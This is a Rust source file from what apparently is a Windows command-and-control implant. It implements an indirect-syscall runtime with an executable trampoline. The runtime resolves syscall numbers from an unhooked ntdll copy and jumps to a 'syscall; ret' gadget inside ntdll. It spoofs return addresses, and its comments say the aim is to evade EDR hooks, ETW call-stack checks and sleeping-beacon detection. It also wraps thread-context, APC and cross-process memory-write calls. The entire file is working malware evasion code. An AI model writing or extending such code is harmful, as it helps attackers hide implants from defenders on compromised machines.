//! Indirect-syscall runtime.
//!
//! This is the capstone that turns `nyx_evasion` from a unit-tested algorithm
//! into a live runtime: it
//!   1. resolves the SSN table over the live ntdll (via `resolve::LiveNtdll`),
//!   2. scans ntdll for a `syscall; ret` gadget (the address an indirect stub
//!      jumps into so the executing RIP/return address land in ntdll),
//!   3. emits the indirect stub bytes (`nyx_evasion::indirect_stub`) into
//!      executable memory and invokes it,
//!   4. exposes a `syscall!` macro + typed wrappers for the Nt* calls the
//!      implant needs.
//!
//! Why indirect: a direct syscall executes `syscall` from implant memory, so
//! the return address points outside any legitimate module — ETW/EDR call-stack
//! checks flag it. Indirect jumps to a `syscall` *inside ntdll*, so RIP and the
//! return address look legitimate. SSN resolution (Hell/Halo/Tartarus) recovers
//! the real numbers even when EDRs hook the stub prologues.

#![cfg(target_os = "windows")]

use crate::heap::{String, Vec};
use crate::resolve::{djb2, LiveNtdll};
use nyx_evasion::stub::indirect_stub;

/// Fixed-size stub slot (bytes). An indirect stub is ~21 bytes; 32 gives
/// alignment margin. Each SSN gets a dedicated slot at `trampoline + (ssn * STUB_SIZE)`.
const STUB_SIZE: usize = 32;

/// The resolved syscall runtime: SSN table + the ntdll `syscall` gadget address
/// + a pre-populated executable trampoline region (one stub slot per SSN).
/// Stubs are written at init time and the whole region is flipped to RX once,
/// eliminating both the per-call VirtualProtect churn and the race condition
/// where multi-threaded/APC contexts could overwrite another thread's stub.
pub struct Runtime {
    /// (api name, SSN) for every resolvable syscall.
    table: Vec<(String, u32)>,
    /// Absolute address of a `syscall; ret` gadget inside ntdll.
    syscall_gadget: u64,
    /// Pre-populated trampoline region (PAGE_EXECUTE_READ after init).
    /// Each SSN's stub lives at `trampoline + (ssn * STUB_SIZE)`.
    trampoline: *mut u8,
}

impl Runtime {
    /// Build the runtime: locate ntdll, resolve SSNs, find the gadget, allocate
    /// the RX trampoline page. Returns None if any step fails (should never
    /// happen in a real process).
    pub unsafe fn init() -> Option<Self> {
        let ntdll = LiveNtdll::locate()?;

        // Resolve SSN table + gadget. Prefer a FRESH ntdll .text from
        // \KnownDlls (pristine — defeats inline hooks); fall back to the
        // hooked in-process ntdll (Halo's/Tartarus' neighbor-walk still
        // recovers most SSNs there). The fresh map is a strict improvement:
        // if it fails (KnownDlls ACL / low IL), behavior is unchanged.
        let mut fresh_guard = FreshMapGuard::default();
        let (table, syscall_gadget) = match crate::unhook::fresh_ntdll_text() {
            Some((fresh_base, _text_rva, _text_size)) => {
                // Names/RVAs from the hooked ntdll (intact), bytes from the fresh.
                let owned: Vec<(String, u32)> = ntdll
                    .exports_iter()
                    .iter()
                    .map(|(name, rva)| (name.to_string_lossy(), *rva))
                    .collect();
                let src = crate::unhook::FreshTextSource {
                    fresh_base,
                    exports: &owned,
                };
                let t = nyx_evasion::resolve_table(&src);
                fresh_guard.set(fresh_base); // RAII: unmap on drop
                                             // CRITICAL: always use the IN-PROCESS ntdll for the gadget address.
                                             // The fresh mapping will be unmapped by FreshMapGuard::drop, so any
                                             // absolute address inside it becomes a dangling pointer — every
                                             // subsequent indirect syscall would crash with an access violation.
                                             // The in-process ntdll's code pages are permanently mapped; EDRs
                                             // hook stub PROLOGUES (the first 5-14 bytes), not the `syscall; ret`
                                             // tail (0F 05 C3), so the gadget scan always finds a clean one.
                let inproc_gadget = scan_syscall_gadget(&ntdll)?;
                (t, inproc_gadget)
            }
            None => {
                // KnownDlls mapping failed (ACL / low IL). Before falling back to
                // the hooked ntdll for SSN resolution too, try reading ntdll off
                // DISK (fresh_ntdll_text_disk): the on-disk file is pristine, so
                // its stub prologues defeat inline hooks even though it isn't a
                // section map. The gadget still has to come from the in-process
                // ntdll (a heap buffer isn't an executable module — jumping to it
                // would DEP-fault), but EDRs hook stub prologues, not the
                // `syscall; ret` instruction itself, so the in-process gadget is
                // fine to land on.
                let inproc_gadget = scan_syscall_gadget(&ntdll)?;
                let owned: Vec<(String, u32)> = ntdll
                    .exports_iter()
                    .iter()
                    .map(|(name, rva)| (name.to_string_lossy(), *rva))
                    .collect();
                match crate::unhook::fresh_ntdll_text_disk() {
                    Some(handle) => {
                        let src = crate::unhook::DiskTextSource::new(&handle, &owned);
                        let t = nyx_evasion::resolve_table(&src);
                        (t, inproc_gadget)
                    }
                    None => {
                        // Last resort: hooked ntdll for both SSN + gadget.
                        // Halo's/Tartarus' neighbor-walk still recovers most SSNs.
                        (ntdll.resolve_table_owned(), inproc_gadget)
                    }
                }
            }
        };
        // fresh_guard drops here → unmaps the second ntdll view (transient IOC).
        // Pre-allocate enough executable pages to hold one stub slot per SSN.
        // Indirect stubs are ~21 bytes; STUB_SIZE=32 gives alignment margin.
        // SSNs on Win10/11 range to ~500, so ~16 KiB of trampoline memory
        // (4 pages) handles all resolved syscalls without per-call VirtualProtect
        // or race conditions between concurrent/APC callers.
        // CRITICAL: filter out unresolved SSNs (u32::MAX) before taking the max.
        // Without this, an all-unresolved table makes max_ssn = u32::MAX, which
        // overflows the trampoline size calculation and writes a wild pointer.
        let max_ssn = table
            .iter()
            .map(|(_, s)| *s)
            .filter(|s| *s != u32::MAX)
            .max()
            .unwrap_or(0);
        let trampoline_bytes = ((max_ssn as usize) + 1) * STUB_SIZE;
        let trampoline_pages = (trampoline_bytes + 0xFFF) & !0xFFF;

        let va = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc")?;
        type VirtualAlloc = unsafe extern "system" fn(
            *mut core::ffi::c_void,
            usize,
            u32,
            u32,
        ) -> *mut core::ffi::c_void;
        let alloc: VirtualAlloc = core::mem::transmute(va);
        // Allocate RW initially so we can write stubs, then flip to RX.
        let page = alloc(
            core::ptr::null_mut(),
            trampoline_pages,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x04,   // PAGE_READWRITE
        );
        if page.is_null() {
            return None;
        }

        // Pre-fill every stub at its fixed offset: trampoline + (ssn * STUB_SIZE).
        for (_name, ssn) in &table {
            // Skip unresolved entries — their SSN is u32::MAX, which would
            // overflow the offset calculation and write out of bounds.
            if *ssn == u32::MAX {
                continue;
            }
            let stub = indirect_stub(*ssn, syscall_gadget);
            core::ptr::copy_nonoverlapping(
                stub.as_ptr(),
                (page as *mut u8).add((*ssn as usize) * STUB_SIZE),
                stub.len(),
            );
        }

        // Flip the entire region to PAGE_EXECUTE_READ once — no more per-call
        // VirtualProtect flips. Uses kernel32!VirtualProtect (PEB-resolved) to
        // avoid recursing through the indirect-syscall trampoline.
        if let Some(vp_addr) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect") {
            type VpFn =
                unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, *mut u32) -> i32;
            let vp: VpFn = core::mem::transmute(vp_addr);
            let mut old: u32 = 0;
            vp(page, trampoline_pages, 0x20, &mut old);
        }

        Some(Self {
            table,
            syscall_gadget,
            trampoline: page as *mut u8,
        })
    }

    /// Look up the SSN for an API by name hash.
    pub fn ssn_by_hash(&self, name_hash: u32) -> Option<u32> {
        // The table holds String names; hash each to match. (Linear scan; the
        // table is a few hundred entries — fine for cold-path resolution.)
        for (name, ssn) in &self.table {
            if djb2(name.as_bytes()) == name_hash && *ssn != u32::MAX {
                return Some(*ssn);
            }
        }
        None
    }

    /// The ntdll `syscall; ret` gadget address (for indirect stubs).
    pub fn gadget(&self) -> u64 {
        self.syscall_gadget
    }

    /// Build the indirect-syscall stub bytes for `ssn`, ready to write into
    /// executable memory and call.
    pub fn indirect_stub_for(&self, ssn: u32) -> Vec<u8> {
        indirect_stub(ssn, self.syscall_gadget)
    }

    /// Return a typed function pointer to the pre-populated stub for `ssn`.
    /// Stubs were written at init time at fixed offsets (`trampoline + ssn * STUB_SIZE`)
    /// and the whole region was flipped to PAGE_EXECUTE_READ once. No per-call
    /// VirtualProtect flips, no copy, and no race condition — each SSN has its
    /// own dedicated slot.
    ///
    /// # Safety
    /// Caller must pass a real SSN resolved from the live ntdll table, and the
    /// pointed-to function must be invoked with arguments matching the target
    /// syscall's signature (Win64 calling convention; first 4 args in
    /// rcx/rdx/r8/r9, rest on stack).
    pub unsafe fn trampoline_for(&self, ssn: u32) -> *const u8 {
        unsafe { self.trampoline.add((ssn as usize) * STUB_SIZE) as *const u8 }
    }
}

/// RAII guard that unmaps the fresh ntdll view on drop, so the second mapping
/// is transient (the fresh map is only needed during SSN/gadget resolution —
/// leaving it mapped is a lingering IOC and a wasted page-aligned region).
struct FreshMapGuard {
    base: *mut u8,
}

impl Default for FreshMapGuard {
    fn default() -> Self {
        Self {
            base: core::ptr::null_mut(),
        }
    }
}

impl FreshMapGuard {
    fn set(&mut self, b: *mut u8) {
        self.base = b;
    }
}

impl Drop for FreshMapGuard {
    fn drop(&mut self) {
        if !self.base.is_null() {
            unsafe { crate::unhook::unmap_fresh(self.base) };
        }
    }
}

/// Scan ntdll's image for a `syscall; ret` byte pair (`0F 05 C3`) and return
/// its absolute address. The first Nt* export stub contains one; any works as
/// the indirect-jump target.
unsafe fn scan_syscall_gadget(ntdll: &LiveNtdll) -> Option<u64> {
    // Scan ntdll for the first `syscall; ret` (0F 05 C3) gadget. The syscall
    // stubs live among ntdll's exports; on modern Windows (with ~2300 exports)
    // they can sit well past 64KB, so we scan a generous range. Reading is done
    // in chunks (not one giant alloc) to stay friendly to the bump allocator.
    let start = 0x1000u32;
    let end = 0x2_00_000u32; // 2 MiB — covers any reasonable ntdll .text
    let chunk = 0x1_0000u32; // 64 KiB chunks
    let mut off = start;
    while off < end {
        let take = chunk.min(end - off);
        let blob = ntdll.read(off, take as usize);
        for i in 0..blob.len().saturating_sub(2) {
            if blob[i] == 0x0F && blob[i + 1] == 0x05 && blob[i + 2] == 0xC3 {
                let rva = off + i as u32;
                return Some(ntdll.module().base as u64 + rva as u64);
            }
        }
        off += take;
    }
    None
}

/// Invoke an indirect syscall by name. Looks up the SSN, writes the indirect
/// stub into the runtime's trampoline page, and calls it as a 4-argument
/// Win64 function returning i32 (NTSTATUS).
///
/// # Safety
/// `rt` must outlive the call and be initialized. Arguments are passed
/// verbatim; the caller is responsible for argument count/types matching the
/// target syscall. Extra (>4) arguments are not supported by this helper — use
/// [`syscall6`] / [`syscall11`] for syscalls with more parameters.
pub unsafe fn syscall4(
    rt: &Runtime,
    name_hash: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
) -> Option<i32> {
    let ssn = rt.ssn_by_hash(name_hash)?;
    // BYOUD-Gap stack spoof: wrap the indirect syscall in spoof_wrap so the
    // caller's return address resolves to a signed-DLL .pdata gap instead of
    // an implant address. Degrades to direct call when: no gap pool installed,
    // swap disabled, or CET active.
    unsafe {
        crate::stack::spoof_wrap(|| {
            let stub_addr = rt.trampoline_for(ssn);
            type Stub = unsafe extern "system" fn(usize, usize, usize, usize) -> i32;
            let f: Stub = core::mem::transmute(stub_addr);
            Some(f(a1, a2, a3, a4))
        })
    }
}

/// 5-argument indirect syscall (e.g. `NtProtectVirtualMemory`). Same stub as
/// [`syscall4`]/[`syscall6`]; the 5th arg rides the stack exactly as a native
/// Win64 call would place it. The trampoline gets cast to a 5-arg fn pointer.
///
/// # Safety
/// Same as [`syscall4`]; a5 must match the target syscall's 5th parameter
/// (stack-passed per Win64 ABI).
pub unsafe fn syscall5(
    rt: &Runtime,
    name_hash: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
) -> Option<i32> {
    let ssn = rt.ssn_by_hash(name_hash)?;
    unsafe {
        crate::stack::spoof_wrap(|| {
            let stub_addr = rt.trampoline_for(ssn);
            type Stub = unsafe extern "system" fn(usize, usize, usize, usize, usize) -> i32;
            let f: Stub = core::mem::transmute(stub_addr);
            Some(f(a1, a2, a3, a4, a5))
        })
    }
}

/// 6-argument indirect syscall. The indirect stub bytes are identical to the
/// 4-arg case — Win64 passes args 5–6 on the stack and the stub neither reads
/// nor clobbers the stack setup the caller did before `call`. The only
/// difference is the Rust callee arity, so the trampoline gets cast to a
/// 6-arg function pointer instead.
///
/// # Safety
/// Same as [`syscall4`]; additionally a5/a6 must match the target syscall's
/// 5th/6th parameters (stack-passed per Win64 ABI).
pub unsafe fn syscall6(
    rt: &Runtime,
    name_hash: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
) -> Option<i32> {
    let ssn = rt.ssn_by_hash(name_hash)?;
    unsafe {
        crate::stack::spoof_wrap(|| {
            let stub_addr = rt.trampoline_for(ssn);
            type Stub = unsafe extern "system" fn(usize, usize, usize, usize, usize, usize) -> i32;
            let f: Stub = core::mem::transmute(stub_addr);
            Some(f(a1, a2, a3, a4, a5, a6))
        })
    }
}

/// 11-argument indirect syscall. Used for the wide-arity NT file/object APIs
/// the implant needs (`NtCreateFile` = 11 args, `NtWriteFile` = 10,
/// `NtReadFile` = 9, `NtQueryDirectoryFile` = 11). The stub is unchanged; the
/// extra args ride the stack exactly as a native call would place them.
///
/// # Safety
/// Same as [`syscall4`]; args 5–11 must match the target syscall's stack-passed
/// parameters. Passing fewer than 11 meaningful args is fine — pad the tail
/// with 0; the syscall ignores positions past its real arity.
pub unsafe fn syscall11(
    rt: &Runtime,
    name_hash: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
    a10: usize,
    a11: usize,
) -> Option<i32> {
    let ssn = rt.ssn_by_hash(name_hash)?;
    unsafe {
        crate::stack::spoof_wrap(|| {
            let stub_addr = rt.trampoline_for(ssn);
            type Stub = unsafe extern "system" fn(
                usize,
                usize,
                usize,
                usize,
                usize,
                usize,
                usize,
                usize,
                usize,
                usize,
                usize,
            ) -> i32;
            let f: Stub = core::mem::transmute(stub_addr);
            Some(f(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11))
        })
    }
}

/// A typed wrapper around an indirect syscall. Resolves the SSN by name hash
/// and invokes the indirect trampoline with 4/6/11 arguments (selected by how
/// many args the call site passes), returning the NTSTATUS.
///
/// Usage:
/// ```text
/// // 4-arg: NtDelayExecution(Alertable=FALSE, &interval, _, _)
/// let st = syscall!(rt, b"ntdelayexecution", 0, &interval as *const _ as usize, 0, 0);
/// // 11-arg: NtCreateFile(&h, access, oa, &iosb, NULL, flags, 0, create, 0, NULL, 0)
/// let st = syscall!(rt, b"ntcreatefile", &mut h as *mut _ as usize, access, oa, &iosb, 0, flags, 0, create, 0, 0);
/// ```
#[macro_export]
macro_rules! syscall {
    ($rt:expr, $name:expr, $a1:expr, $a2:expr, $a3:expr, $a4:expr,
     $a5:expr, $a6:expr, $a7:expr, $a8:expr, $a9:expr, $a10:expr, $a11:expr) => {
        $crate::syscalls::syscall11(
            $rt,
            $crate::resolve::djb2($name),
            $a1,
            $a2,
            $a3,
            $a4,
            $a5,
            $a6,
            $a7,
            $a8,
            $a9,
            $a10,
            $a11,
        )
    };
    ($rt:expr, $name:expr, $a1:expr, $a2:expr, $a3:expr, $a4:expr, $a5:expr, $a6:expr) => {
        $crate::syscalls::syscall6(
            $rt,
            $crate::resolve::djb2($name),
            $a1,
            $a2,
            $a3,
            $a4,
            $a5,
            $a6,
        )
    };
    ($rt:expr, $name:expr, $a1:expr, $a2:expr, $a3:expr, $a4:expr) => {
        $crate::syscalls::syscall4($rt, $crate::resolve::djb2($name), $a1, $a2, $a3, $a4)
    };
    // SSN-only form (no invocation) — kept for callers that just need the number.
    ($rt:expr, $name:expr) => {
        $rt.ssn_by_hash($crate::resolve::djb2($name))
    };
}

/// Process-wide indirect-syscall runtime, initialized once at entry. Resolving
/// ntdll + scanning the gadget + allocating the trampoline is expensive and
/// idempotent, so it happens exactly once and every syscall caller borrows the
/// cached `Runtime`. `None` until [`init_global`] has run (entry does this
/// during bootstrap) or if init failed — callers must treat `None` as
/// "indirect syscalls unavailable" and fall back to a Win32 export path.
static GLOBAL_RT: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);

/// Initialize the global runtime once. Safe to call repeatedly; only the first
/// successful call installs the runtime. Subsequent calls are no-ops.
///
/// # Safety
/// Must be called from the single beacon thread before any caller uses
/// [`global()`]. The beacon loop is single-threaded, so there is no race.
pub unsafe fn init_global() {
    use core::sync::atomic::Ordering;
    if GLOBAL_RT.load(Ordering::Acquire) != 0 {
        return;
    }
    if let Some(rt) = Runtime::init() {
        // Leak: the Runtime lives for the process lifetime (it holds the
        // trampoline page). The implant never tears it down.
        let boxed = alloc::boxed::Box::leak(alloc::boxed::Box::new(rt));
        GLOBAL_RT.store(boxed as *mut _ as usize, Ordering::Release);
    }
}

/// Diagnostic: run Runtime::init step by step, exiting at each milestone so a
/// crash narrows to the failing step. Exit codes:
///   0xB0 = LiveNtdll::locate ok
///   0xB1 = fresh_ntdll_text() (KnownDlls) returned Some
///   0xB2 = SSN table resolved (non-empty)
///   0xB3 = gadget found
///   0xB4 = trampoline page allocated
///   0xB5 = Runtime built + Box::leak installed
/// A crash (127) before any of these = the step crashed.
#[cfg(feature = "selftest")]
#[no_mangle]
#[allow(unused_assignments)]
pub unsafe extern "system" fn nyx_selftest_rt_steps() {
    // ExitProcess resolved inline (can't depend on selftests::exit ordering).
    let exit_proc = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess");
    let do_exit = |code: u32| -> ! {
        if let Some(e) = exit_proc {
            let f: extern "system" fn(u32) -> ! = unsafe { core::mem::transmute(e) };
            f(code);
        }
        loop {
            core::hint::spin_loop();
        }
    };
    let ntdll = match LiveNtdll::locate() {
        Some(n) => n,
        None => do_exit(0xCF),
    };
    // 0xB1: fresh_ntdll_text (KnownDlls map).
    let fresh = crate::unhook::fresh_ntdll_text();
    // 0xB2: SSN table resolution (the suspected crash point — allocates a Vec
    // of (String, u32) per export, ~2300 entries).
    let (table, _gadget_placeholder) = match fresh {
        Some((fresh_base, _text_rva, _text_size)) => {
            let owned: Vec<(String, u32)> = ntdll
                .exports_iter()
                .iter()
                .map(|(name, rva)| (name.to_string_lossy(), *rva))
                .collect();
            let src = crate::unhook::FreshTextSource {
                fresh_base,
                exports: &owned,
            };
            let t = nyx_evasion::resolve_table(&src);
            crate::unhook::unmap_fresh(fresh_base);
            (t, 0u64)
        }
        None => {
            // disk fallback or hooked ntdll
            let t = ntdll.resolve_table_owned();
            (t, 0u64)
        }
    };
    // 0xB3: gadget scan over the in-process ntdll.
    #[allow(unused_assignments, unused_variables)]
    let mut step: u32 = 0xB2;
    let g = scan_syscall_gadget(&ntdll);
    if g.is_some() {
        step = 0xB3;
        // 0xB4: trampoline page (VirtualAlloc RX).
        if let Some(va) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc") {
            type VirtualAlloc = unsafe extern "system" fn(
                *mut core::ffi::c_void,
                usize,
                u32,
                u32,
            ) -> *mut core::ffi::c_void;
            let f: VirtualAlloc = unsafe { core::mem::transmute(va) };
            let page = unsafe { f(core::ptr::null_mut(), 0x1000, 0x3000, 0x20) };
            if !page.is_null() {
                step = 0xB4;
            }
        }
    }
    let _ = table;
    let _ = g;
    // 0xB5: the REAL Runtime::init (what init_global calls). If this crashes
    // (exit 127) the bug is inside Runtime::init's full path, not the pieces.
    let rt = Runtime::init();
    do_exit(if rt.is_some() { 0xB5 } else { 0xD5 });
}

/// Borrow the process-wide runtime, if it has been initialized.
pub fn global() -> Option<&'static Runtime> {
    use core::sync::atomic::Ordering;
    let p = GLOBAL_RT.load(Ordering::Acquire);
    if p == 0 {
        None
    } else {
        // SAFETY: the pointer was installed by init_global and points to a
        // 'static leaked Runtime that outlives the process.
        Some(unsafe { &*(p as *const Runtime) })
    }
}

/// Resolve the SSN for `NtAllocateVirtualMemory` (the canonical first syscall
/// an implant makes — proves the runtime is live).
pub fn ssn_nt_allocate_virtual_memory(rt: &Runtime) -> Option<u32> {
    rt.ssn_by_hash(djb2(b"ntallocatevirtualmemory"))
}

// ---- typed wrappers for the Nt* calls the fs module needs ----
//
// These exist so callers don't have to count macro arguments (a fragile
// exercise with 9/10/11-arity NT APIs). Each wrapper invokes the matching
// fixed-arity `syscallN` with the runtime resolved by name hash, padding the
// high arities to their fixed slot count. Return `Option<NTSTATUS>`: None if
// the runtime is down or the SSN couldn't be resolved; Some(status) otherwise.

/// `NtClose(Handle)` — 1 real arg, called via the 4-arg shim (extras ignored).
pub unsafe fn nt_close(rt: &Runtime, handle: usize) -> Option<i32> {
    syscall4(rt, djb2(b"ntclose"), handle, 0, 0, 0)
}

/// `NtCreateFile` — 11 real args.
pub unsafe fn nt_create_file(
    rt: &Runtime,
    file_handle: usize,
    desired_access: u32,
    obj_attr: usize,
    io_status: usize,
    allocation_size: usize,
    file_attributes: u32,
    share_access: u32,
    create_disposition: u32,
    create_options: u32,
    ea_buffer: usize,
    ea_length: usize,
) -> Option<i32> {
    syscall11(
        rt,
        djb2(b"ntcreatefile"),
        file_handle,
        desired_access as usize,
        obj_attr,
        io_status,
        allocation_size,
        file_attributes as usize,
        share_access as usize,
        create_disposition as usize,
        create_options as usize,
        ea_buffer,
        ea_length,
    )
}

/// `NtWriteFile` — 9 real args (padded into the 11-arg shim).
pub unsafe fn nt_write_file(
    rt: &Runtime,
    handle: usize,
    event: usize,
    apc_routine: usize,
    apc_context: usize,
    io_status: usize,
    buffer: usize,
    length: usize,
    byte_offset: usize,
    key: usize,
) -> Option<i32> {
    syscall11(
        rt,
        djb2(b"ntwritefile"),
        handle,
        event,
        apc_routine,
        apc_context,
        io_status,
        buffer,
        length,
        byte_offset,
        key,
        0,
        0,
    )
}

/// `NtReadFile` — 9 real args (padded into the 11-arg shim).
pub unsafe fn nt_read_file(
    rt: &Runtime,
    handle: usize,
    event: usize,
    apc_routine: usize,
    apc_context: usize,
    io_status: usize,
    buffer: usize,
    length: usize,
    byte_offset: usize,
    key: usize,
) -> Option<i32> {
    syscall11(
        rt,
        djb2(b"ntreadfile"),
        handle,
        event,
        apc_routine,
        apc_context,
        io_status,
        buffer,
        length,
        byte_offset,
        key,
        0,
        0,
    )
}

/// `NtSetInformationFile` — 5 real args (padded into the 6-arg shim).
pub unsafe fn nt_set_information_file(
    rt: &Runtime,
    handle: usize,
    io_status: usize,
    file_info: usize,
    length: usize,
    file_info_class: u32,
) -> Option<i32> {
    syscall6(
        rt,
        djb2(b"ntsetinformationfile"),
        handle,
        io_status,
        file_info,
        length,
        file_info_class as usize,
        0,
    )
}

/// `NtQueryAttributesFile` — 2 real args (padded into the 4-arg shim).
pub unsafe fn nt_query_attributes_file(
    rt: &Runtime,
    obj_attr: usize,
    file_info: usize,
) -> Option<i32> {
    syscall4(
        rt,
        djb2(b"ntqueryattributesfile"),
        obj_attr,
        file_info,
        0,
        0,
    )
}

/// `NtDelayExecution` — 2 real args (padded into the 4-arg shim).
pub unsafe fn nt_delay_execution(rt: &Runtime, alertable: u8, delay: usize) -> Option<i32> {
    syscall4(
        rt,
        djb2(b"ntdelayexecution"),
        alertable as usize,
        delay,
        0,
        0,
    )
}

/// `NtWaitForSingleObject(Handle, Alertable, Timeout*)` — 3 real args, padded
/// into the 4-arg shim. With `Handle = INVALID_HANDLE_VALUE` (-1) and
/// `Alertable = TRUE`, gives wait-reason `UserRequest` instead of
/// `DelayExecution`, defeating Hunt-Sleeping-Beacons heuristics. When Alertable
/// is `FALSE`, this is the standard non-alertable floor-sleep replacement.
///
/// # Safety
/// `timeout` must point at a valid `i64` (100ns units, negative = relative).
pub unsafe fn nt_wait_for_single_object(
    rt: &Runtime,
    handle: usize,
    alertable: u8,
    timeout: usize,
) -> Option<i32> {
    syscall4(
        rt,
        djb2(b"ntwaitforsingleobject"),
        handle,
        alertable as usize,
        timeout,
        0,
    )
}

/// `NtProtectVirtualMemory` — 5 real args: ProcessHandle, BaseAddress* (IN OUT),
/// RegionSize* (IN OUT), NewAccessMask, OldAccessMask* (OUT). Used by Foliage
/// (RX↔RW flip) + mem (.text mask). The current-process pseudo-handle
/// (`0xFFFF_FFFF_FFFF_FFFF`) is passed for ProcessHandle.
///
/// # Safety
/// `base`/`size`/`old_prot` must be valid mutable refs the syscall can write
/// through; `new_prot` is a PAGE_* constant. Single-threaded beacon context.
pub unsafe fn nt_protect_virtual_memory(
    rt: &Runtime,
    base: &mut usize,
    size: &mut usize,
    new_prot: u32,
    old_prot: &mut u32,
) -> Option<i32> {
    syscall5(
        rt,
        djb2(b"ntprotectvirtualmemory"),
        0xFFFF_FFFF_FFFF_FFFF, // NtCurrentProcess pseudo-handle
        base as *mut usize as usize,
        size as *mut usize as usize,
        new_prot as usize,
        old_prot as *mut u32 as usize,
    )
}

/// `NtQueueApcThread(ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2,
/// ApcArgument3)` — 5 real args. Used by the Foliage chain to queue `NtContinue`
/// APCs that walk the sleeping thread through its context dance.
///
/// # Safety
/// `thread` must be a real thread handle with THREAD_SET_CONTEXT access.
pub unsafe fn nt_queue_apc_thread(
    rt: &Runtime,
    thread: usize,
    apc_routine: usize,
    arg1: usize,
    arg2: usize,
    arg3: usize,
) -> Option<i32> {
    syscall5(
        rt,
        djb2(b"ntqueueapcthread"),
        thread,
        apc_routine,
        arg1,
        arg2,
        arg3,
    )
}

/// `NtContinue(ContextRecord, RaiseAlert)` — 2 real args. Restores a thread's
/// register state from a CONTEXT struct. The Foliage chain queues APCs that
/// each call NtContinue to install the next context in the mask→sleep→unmask
/// dance. 2 args → padded into the 4-arg shim.
///
/// # Safety
/// `ctx` must point at a valid, properly-aligned CONTEXT (1232 bytes on x64).
pub unsafe fn nt_continue(rt: &Runtime, ctx: usize, raise_alert: u8) -> Option<i32> {
    syscall4(rt, djb2(b"ntcontinue"), ctx, raise_alert as usize, 0, 0)
}

/// `NtGetContextThread(ThreadHandle, ContextRecord)` — 2 real args. Captures
/// the current register state of `thread` into `ctx`. Used by Foliage to save
/// the original CONTEXT before installing a spoofed one.
///
/// # Safety
/// `ctx` must point at an aligned, writable CONTEXT buffer (1232 bytes on x64).
pub unsafe fn nt_get_context_thread(rt: &Runtime, thread: usize, ctx: usize) -> Option<i32> {
    syscall4(rt, djb2(b"ntgetcontextthread"), thread, ctx, 0, 0)
}

/// `NtSetContextThread(ThreadHandle, ContextRecord)` — 2 real args. Installs
/// `ctx` as the register state of `thread`. Used by Foliage to set the spoofed
/// CONTEXT (RIP = gap address) and later restore the original.
///
/// # Safety
/// `ctx` must point at a valid CONTEXT. Modifying a running thread's RIP/RSP
/// is inherently dangerous — only call when the thread is known-suspended or
/// in a controlled APC window.
pub unsafe fn nt_set_context_thread(rt: &Runtime, thread: usize, ctx: usize) -> Option<i32> {
    syscall4(rt, djb2(b"ntsetcontextthread"), thread, ctx, 0, 0)
}

/// `NtAllocateVirtualMemory(ProcessHandle, BaseAddress*, RegionSize, AllocationType,
/// Protect)` — 5 real args. Allocates virtual memory in the target process.
/// Pass `NtCurrentProcess` pseudo-handle (0xFFFF_FFFF_FFFF_FFFF) for
/// current-process allocations; a real handle for cross-process allocs.
///
/// # Safety
/// `base_out` must point at a valid `usize` the syscall writes the allocated
/// base address through. `region_size` is IN/OUT (on input: desired size; on
/// output: actually allocated).
pub unsafe fn nt_allocate_virtual_memory(
    rt: &Runtime,
    process_handle: usize,
    base_out: &mut usize,
    region_size: &mut usize,
    allocation_type: u32,
    protect: u32,
) -> Option<i32> {
    syscall5(
        rt,
        djb2(b"ntallocatevirtualmemory"),
        process_handle,
        base_out as *mut usize as usize,
        region_size as *mut usize as usize,
        allocation_type as usize,
        protect as usize,
    )
}

/// `NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, Size, Written*)` —
/// 5 real args. Writes `size` bytes from `buffer` into the target process at
/// `base`. Returns the number of bytes written in `written`.
///
/// # Safety
/// `buffer` must be readable for `size` bytes; `written` must be a valid `usize`
/// pointer. `process_handle` must have PROCESS_VM_WRITE access.
pub unsafe fn nt_write_virtual_memory(
    rt: &Runtime,
    process_handle: usize,
    base_address: usize,
    buffer: *const u8,
    size: usize,
    written: &mut usize,
) -> Option<i32> {
    syscall5(
        rt,
        djb2(b"ntwritevirtualmemory"),
        process_handle,
        base_address,
        buffer as usize,
        size,
        written as *mut usize as usize,
    )
}

/// `NtSuspendThread(ThreadHandle, PreviousSuspendCount*)` — 2 real args. Suspends
/// the target thread; returns its prior suspend count (or 0xFFFFFFFF on error).
/// Padded into the 4-arg shim.
///
/// # Safety
/// `thread` must have THREAD_SUSPEND_RESUME access. `prev_count` may be null
/// (the output is ignored via padding) or a valid `u32` pointer.
pub unsafe fn nt_suspend_thread(rt: &Runtime, thread: usize, prev_count: &mut u32) -> Option<i32> {
    syscall4(
        rt,
        djb2(b"ntsuspendthread"),
        thread,
        prev_count as *mut u32 as usize,
        0,
        0,
    )
}

/// `NtResumeThread(ThreadHandle, PreviousSuspendCount*)` — 2 real args. Resumes
/// a suspended thread. Padded into the 4-arg shim.
///
/// # Safety
/// `thread` must have THREAD_SUSPEND_RESUME access. `prev_count` may be null
/// (the output is ignored via padding) or a valid `u32` pointer.
pub unsafe fn nt_resume_thread(rt: &Runtime, thread: usize, prev_count: &mut u32) -> Option<i32> {
    syscall4(
        rt,
        djb2(b"ntresumethread"),
        thread,
        prev_count as *mut u32 as usize,
        0,
        0,
    )
}

/// `NtOpenThread` — opens a handle to a thread by its TID + client ID. Used by
/// Foliage to get a handle to the current (beacon) thread for APC queuing.
/// 4 real args (ThreadHandle*, DesiredAccess, ObjectAttrs, ClientId*).
pub unsafe fn nt_open_thread(
    rt: &Runtime,
    handle_out: usize,
    desired_access: u32,
    obj_attr: usize,
    client_id: usize,
) -> Option<i32> {
    syscall4(
        rt,
        djb2(b"ntopenthread"),
        handle_out,
        desired_access as usize,
        obj_attr,
        client_id,
    )
}

